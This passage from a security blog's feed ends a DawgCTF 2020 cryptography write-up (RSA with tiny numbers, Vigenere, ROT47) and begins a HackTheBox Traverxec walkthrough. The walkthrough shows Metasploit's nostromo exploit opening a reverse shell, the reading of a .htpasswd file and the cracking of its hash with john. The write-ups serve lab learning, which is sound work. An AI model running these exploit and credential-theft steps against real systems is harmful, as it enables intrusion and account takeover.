&lt;span class="code-line"&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#print(r)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;iv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#print(iv)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dec:&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;iv&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;b"\xd6z\xbd\xfb\x9a\x82\xb91\xa5\x12\n['\xfb\x92\xb5DawgCTF{!_Th0ugh7_Th3_C!ph3rt3x7_W@s_Sh0rt3r.}"&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="left-foot-two-stomps-250"&gt;Left Foot Two Stomps (250)&lt;/h2&gt;
&lt;p&gt;This the only offline challenge and we didn't get any client for this one.
The only information was the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;n=960242069 e=347 c=346046109,295161774,616062960,790750242,259677897,945606673,
321883599,625021022,731220302,556994500,118512782,843462311,321883599,202294479,
725148418,725148418,636253020,70699533,475241234,530533280,860892522,530533280,
657690757,110489031,271790171,221180981,221180981,278854535,202294479,231979042,
725148418,787183046,346046109,657690757,530533280,770057231,271790171,584652061,
405302860,137112544,137112544,851931432,118512782,683778547,616062960,508395428,
271790171,185391473,923405109,227720616,563542899,770121847,185391473,546341739,
851931432,657690757,851931432,284629213,289862692,788320338,770057231,770121847&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This looks like some RSA with "small numbers" ;)&lt;/p&gt;
&lt;p&gt;We can easily factorise &lt;code&gt;n&lt;/code&gt;. Once we know &lt;code&gt;n&lt;/code&gt; we can compute &lt;code&gt;phi&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;n=960242069=151*6359219&lt;/span&gt;
&lt;span class="code-line"&gt;Phi = (p-1)(q-1) = 150*6359218 = 953882700&lt;/span&gt;
&lt;span class="code-line"&gt;e = 347&lt;/span&gt;
&lt;span class="code-line"&gt;ed = 1 mod 953882700&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then, as we already know &lt;code&gt;e&lt;/code&gt; we can compute &lt;code&gt;d&lt;/code&gt; with a simple python loop.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; i = 347&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; while (347*i%953882700 !=1):&lt;/span&gt;
&lt;span class="code-line"&gt;...     i+=1&lt;/span&gt;
&lt;span class="code-line"&gt;...&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; i&lt;/span&gt;
&lt;span class="code-line"&gt;5497883&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We create a list &lt;code&gt;c&lt;/code&gt; of the number as in the challenge description and decode
every element using our RSA numbers.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; c=[346046109,295161774,616062960,&amp;lt;SNIP&amp;gt;,770057231,770121847]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; for elem in c:&lt;/span&gt;
&lt;span class="code-line"&gt;...     print(chr((elem**5497883)%960242069))&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This was a bit long as a single process is involved but at the end we got the
following output: &lt;code&gt;xhBQCUIcbPf7IN88AT9FDFsqEOOjNM8uxsFrEJZRRifKB1E=|key=visionary&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I struggle a lot before thinking about that being a Vigenere cipher using the
key &lt;code&gt;visionary&lt;/code&gt;. At first I was thinking about AES-CBC (as the other challenges) but
we don't have any IV here.&lt;/p&gt;
&lt;p&gt;Once decrypted with the key we get the following: &lt;code&gt;zJIOHIldUx7QF88MG9FMHxiMGAwNV8wckNjQWZATnxST1Q=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We decrypt the base64:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ echo -ne &amp;#39;czJIOHIldUx7QF88MG9FMHxiMGAwNV8wckNjQWZATnxST1Q=&amp;#39; | base64 -d&lt;/span&gt;
&lt;span class="code-line"&gt;s2H8r%uL{@_&amp;lt;0oE0|b0`05_0rCcAf@N|ROT&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And then a ROT47 give us the flag: &lt;code&gt;DawgCTF{Lo0k_@t_M3_1_d0_Cr4p7o}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Here is the &lt;a href="https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('visionary')From_Base64('A-Za-z0-9%2B/%3D',true)ROT47(47)&amp;input=eGhCUUNVSWNiUGY3SU44OEFUOUZERnNxRU9Pak5NOHV4c0ZyRUpaUlJpZktCMUU9"&gt;Cyber Chef recipe&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="slide-to-the-left-350"&gt;Slide To The Left (350)&lt;/h2&gt;
&lt;p&gt;The client code is exactly the same as "Right Foot Two Stomps".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Created for Spring 2020 CTF&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Cryptography 2.5&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;200 Points&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Welcome to the AES-CBC oracle!&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Our oracle&amp;#39;s function is AES-CBC.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;The oracle is found at umbccd.io:13373, and your methods are:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;    flg - returns the encrypted flag&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;    enc - returns the encryption of the message after the : in &amp;quot;enc:...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;          as 16 bytes of initialization vector followed by the ciphertext.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;    dec - returns the decryption of the ciphertext after the : in &amp;quot;dec:&amp;lt;16 bytes iv&amp;gt;...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;          as a bytes string.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;@author: pleoxconfusa&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If we rerun the code for the previous challenge we get: &lt;code&gt;b'We already did this one.'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which is obviously is not the flag. We didn't solve this challenge in time.
I tried solve it using
&lt;a href="https://en.wikipedia.org/wiki/Padding_oracle_attack"&gt;Oracle padding&lt;/a&gt; but this
was for the next challenge :(&lt;/p&gt;
&lt;h1 id="misc"&gt;Misc&lt;/h1&gt;
&lt;p&gt;There was one "Misc" challenge that actually was crypto.&lt;/p&gt;
&lt;h2 id="let-her-eat-cake-75"&gt;Let Her Eat Cake! 75&lt;/h2&gt;
&lt;p&gt;We got some description and photo about
&lt;a href="https://en.wikipedia.org/wiki/Elizebeth_Smith_Friedman"&gt;Elizebeth Smith Friedman&lt;/a&gt;
and then a cipher text&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hwyjpgxwkmgvbxaqgzcsnmaknbjktpxyezcrmlja?
GqxkiqvcbwvzmmxhspcsqwxyhqentihuLivnfzaknagxfxnctLcchKCH{CtggsMmie_kteqbx}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This clearly look like some Polyalphabetic substitution. In fact this is a simple
Viegenere cipher using the key &lt;code&gt;AICGBIJC&lt;/code&gt; (we decode it using
&lt;a href="https://www.dcode.fr/vigenere-cipher"&gt;dcode.fr&lt;/a&gt;).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Howdoyoukeepaprogrammerintheshowerallday?
GivehimabottleofshampoowhichsaysLatherrinserepeatDawgCTF{ClearEdge_crypto}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This CTF was fun as there was a lot of task but "easy" ones. Which give you some
need to continue solving the other ones.&lt;/p&gt;
&lt;p&gt;I am really proud of the team as we get nice score!&lt;/p&gt;
&lt;p&gt;&lt;img alt="Scoreboard" src="/media/2020.04/dawgctf_01.png"&gt;&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="CTF"></category><category term="crypto"></category><category term="RSA"></category></entry><entry><title>HTB: Traverxec</title><link href="https://maggick.fr/2020/04/htb-traverxec.html" rel="alternate"></link><published>2020-04-11T19:00:00+02:00</published><updated>2020-04-11T19:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-11:/2020/04/htb-traverxec.html</id><summary type="html">&lt;p&gt;&lt;img alt="Traverxec Card" class="align-left" src="/media/2020.04/traverxec_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/217"&gt;Traverxec&lt;/a&gt;.
This box is rated as an easy box. It implies the exploitation of a CVE on
notsromo, the use of some nostromo misconfiguration and a little trick to
trigger a page with a &lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/traverxec_card.png" alt="Traverxec Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/217"&gt;Traverxec&lt;/a&gt;.
This box is rated as an easy box. It implies the exploitation of a CVE on
notsromo, the use of some nostromo misconfiguration and a little trick to
trigger a page with a &lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;


&lt;h1 id="user-part"&gt;User part&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Nov 27 08:58:11 2019 as: nmap -p- -sS -oA nmap 10.10.10.165&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.165&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.088s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Wed Nov 27 09:01:46 2019 -- 1 IP address (1 host up) scanned in 215.57 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Nothing particular about this services.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Nov 27 09:04:36 2019 as: nmap -p22,80 -sSV -oA nmap 10.10.10.165&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.165&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.097s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    nostromo 1.9.6&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Wed Nov 27 09:04:44 2019 -- 1 IP address (1 host up) scanned in 7.91 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is an exploit for nostromo in version 1.9.3 and a metasploit exploit
without a precision about the version.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# searchsploit nostromo&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                         |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                      | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Nostromo - Directory Traversal Remote  | exploits/multiple/remote/47573.rb&lt;/span&gt;
&lt;span class="code-line"&gt;nostromo nhttpd 1.9.3 - Directory Trav | exploits/linux/remote/35466.sh&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;We run a dirb against the web service.&lt;/p&gt;
&lt;p&gt;The website is a portfolio for a web and apps developer.&lt;/p&gt;
&lt;p&gt;&lt;img alt="homepage" src="/media/2020.04/traverxec_1.png"&gt;&lt;/p&gt;
&lt;p&gt;The directory are listable.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Directory listing" src="/media/2020.04/traverxec_2.png"&gt;&lt;/p&gt;
&lt;p&gt;Nothing interesting on the web part. Let us run the exploit found in the recon.&lt;/p&gt;
&lt;h2 id="msf"&gt;MSF&lt;/h2&gt;
&lt;p&gt;We load the exploit in metasploit, set the option to target the box and set our
IP work the reverse shell and run it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; use exploit/multi/http/nostromo_code_exec&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (exploit/multi/http/nostromo_code_exec):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;   Name     Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;   ----     ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="code-line"&gt;   RHOSTS   10.10.10.165     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;   RPORT    80               yes       The target port (TCP)&lt;/span&gt;
&lt;span class="code-line"&gt;   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0&lt;/span&gt;
&lt;span class="code-line"&gt;   SRVPORT  8080             yes       The local port to listen on.&lt;/span&gt;
&lt;span class="code-line"&gt;   SSL      false            no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="code-line"&gt;   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)&lt;/span&gt;
&lt;span class="code-line"&gt;   URIPATH                   no        The URI to use for this exploit (default is random)&lt;/span&gt;
&lt;span class="code-line"&gt;   VHOST                     no        HTTP server virtual host&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Payload options (cmd/unix/reverse_perl):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;   Name   Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;   ----   ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;   LHOST  10.10.15.7       yes       The listen address (an interface may be specified)&lt;/span&gt;
&lt;span class="code-line"&gt;   LPORT  4444             yes       The listen port&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;   Id  Name&lt;/span&gt;
&lt;span class="code-line"&gt;   --  ----&lt;/span&gt;
&lt;span class="code-line"&gt;   0   Automatic (Unix In-Memory)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.15.7:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Configuring Automatic (Unix In-Memory) target&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Sending cmd/unix/reverse_perl command payload&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Command shell session 2 opened (10.10.15.7:4444 -&amp;gt; 10.10.10.165:56360) at 2019-11-27 09:50:39 +0100&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="nostromo"&gt;nostromo&lt;/h2&gt;
&lt;p&gt;We got a shell as &lt;code&gt;www-data&lt;/code&gt;. We start enumerating the box. There is a specific
folder for the &lt;a href="http://www.nazgul.ch/dev_nostromo.html"&gt;nostromo web server&lt;/a&gt;. In
&lt;code&gt;/var/nostromo/&lt;/code&gt; we found some configuration files.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /var/&lt;/span&gt;
&lt;span class="code-line"&gt;backups&lt;/span&gt;
&lt;span class="code-line"&gt;cache&lt;/span&gt;
&lt;span class="code-line"&gt;lib&lt;/span&gt;
&lt;span class="code-line"&gt;local&lt;/span&gt;
&lt;span class="code-line"&gt;lock&lt;/span&gt;
&lt;span class="code-line"&gt;log&lt;/span&gt;
&lt;span class="code-line"&gt;mail&lt;/span&gt;
&lt;span class="code-line"&gt;nostromo&lt;/span&gt;
&lt;span class="code-line"&gt;opt&lt;/span&gt;
&lt;span class="code-line"&gt;run&lt;/span&gt;
&lt;span class="code-line"&gt;spool&lt;/span&gt;
&lt;span class="code-line"&gt;tmp&lt;/span&gt;
&lt;span class="code-line"&gt;ls /var/nostromo/&lt;/span&gt;
&lt;span class="code-line"&gt;conf&lt;/span&gt;
&lt;span class="code-line"&gt;htdocs&lt;/span&gt;
&lt;span class="code-line"&gt;icons&lt;/span&gt;
&lt;span class="code-line"&gt;logs&lt;/span&gt;
&lt;span class="code-line"&gt;ls -al /var/nostromo/&lt;/span&gt;
&lt;span class="code-line"&gt;total 24&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  6 root     root   4096 Oct 25 14:43 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 12 root     root   4096 Oct 25 14:43 ..&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  2 root     daemon 4096 Oct 27 16:12 conf&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  6 root     daemon 4096 Oct 25 17:11 htdocs&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  2 root     daemon 4096 Oct 25 14:43 icons&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  2 www-data daemon 4096 Nov 27 03:39 logs&lt;/span&gt;
&lt;span class="code-line"&gt;ls -al /var/nostromo//conf/&lt;/span&gt;
&lt;span class="code-line"&gt;total 20&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We display the content of the &lt;code&gt;.htpasswd&lt;/code&gt; file and found a hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /var/nostromo//conf/.htpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We load it into john an crack it with the rockyou dictionary. The password is
"Nowonly4me".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;Nowonly4me       (david)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us take a closer look at the &lt;code&gt;nhttpd.conf&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /var/nostromo/conf/nhttpd.conf&lt;/span&gt;
&lt;span class="code-line"&gt;# MAIN [MANDATORY]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;servername      traverxec.htb&lt;/span&gt;
&lt;span class="code-line"&gt;serverlisten        *&lt;/span&gt;
&lt;span class="code-line"&gt;serveradmin     david@traverxec.htb&lt;/span&gt;
&lt;span class="code-line"&gt;serverroot      /var/nostromo&lt;/span&gt;
&lt;span class="code-line"&gt;servermimes     conf/mimes&lt;/span&gt;
&lt;span class="code-line"&gt;docroot         /var/nostromo/htdocs&lt;/span&gt;
&lt;span class="code-line"&gt;docindex        index.html&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# LOGS [OPTIONAL]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;lopid           logs/nhttpd.pid&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# SETUID [RECOMMENDED]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;user            www-data&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# BASIC AUTHENTICATION [OPTIONAL]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;htaccess        .htaccess&lt;/span&gt;
&lt;span class="code-line"&gt;htpasswd        /var/nostromo/conf/.htpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# ALIASES [OPTIONAL]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/icons          /var/nostromo/icons&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# HOMEDIRS [OPTIONAL]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;homedirs        /home&lt;/span&gt;
&lt;span class="code-line"&gt;homedirs_public     public_www&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;According to &lt;a href="http://www.nazgul.ch/dev/nostromo_man.html"&gt;Nostromo manual&lt;/a&gt; the
&lt;code&gt;HOMEDIRS&lt;/code&gt; section allow the server to serve the user's home and some specific
folder. In fact this is possible as the &lt;code&gt;http://10.10.10.165/~david/&lt;/code&gt; show us.&lt;/p&gt;
&lt;p&gt;&lt;img alt="http://10.10.10.165/~david/" src="/media/2020.04/traverxec_5.png"&gt;&lt;/p&gt;
